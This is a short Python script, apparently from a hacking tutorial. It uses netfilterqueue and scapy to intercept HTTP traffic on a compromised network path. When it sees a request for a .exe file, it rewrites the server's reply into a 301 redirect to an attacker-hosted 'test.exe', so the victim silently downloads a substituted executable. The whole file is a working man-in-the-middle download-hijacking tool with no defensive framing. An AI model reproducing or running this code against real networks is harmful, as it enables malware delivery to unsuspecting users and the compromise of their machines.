import netfilterqueue
import scapy.all as scapy

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in str(scapy_packet[scapy.Raw].load):
                print("EXE Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("EXE Response")
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://localIP/test.exe\n\n"
                
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum


                packet.set_payload(bytes(scapy_packet))

    packet.accept()



queue = netfilterqueue.NetfilterQueue()

#0 is the queue number mentionned in iptables command
queue.bind(0, process_packet)

queue.run()